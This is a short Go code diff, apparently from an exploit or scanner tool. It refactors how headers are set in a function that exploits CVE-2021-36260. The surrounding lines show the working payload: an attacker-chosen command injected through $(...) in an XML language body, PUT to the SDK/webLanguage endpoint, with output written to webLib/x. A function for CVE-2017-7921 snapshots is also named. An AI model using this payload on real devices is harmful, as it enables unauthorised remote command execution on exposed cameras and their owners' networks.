@@ -92,8 +92,9 @@ func CVE_2017_7921_Snapshot(url string, client *http.Client) []byte {
 }
 
 func CVE_2021_36260(url, cmd string, client *http.Client) string {
-	h := http.Header{}
-	h.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+	h := map[string]string{
+		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+	}
 	body := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(%s>webLib/x)</language>`, cmd)
 	resp, _, err := clients.NewRequest("PUT", url+"SDK/webLanguage", h, strings.NewReader(body), 10, false, client)
 	if err != nil {
